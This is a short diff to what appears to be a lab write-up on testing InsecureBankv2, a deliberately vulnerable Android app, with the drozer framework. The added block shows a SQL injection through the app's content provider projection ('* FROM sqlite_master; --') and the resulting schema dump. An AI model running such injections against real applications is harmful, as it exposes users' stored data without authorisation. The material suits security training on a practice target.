@@ -117,6 +117,15 @@ Attempting to run shell module
 | id | name |
 ```
 
+```
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* FROM sqlite_master; --"
+Attempting to run shell module
+| type  | name             | tbl_name         | rootpage | sql                                                                            |
+| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                    |
+| table | names            | names            | 4        | CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL) |
+| table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                         |
+```
+
 
 ```
 dz> run scanner.provider.injection -a com.android.insecurebankv2
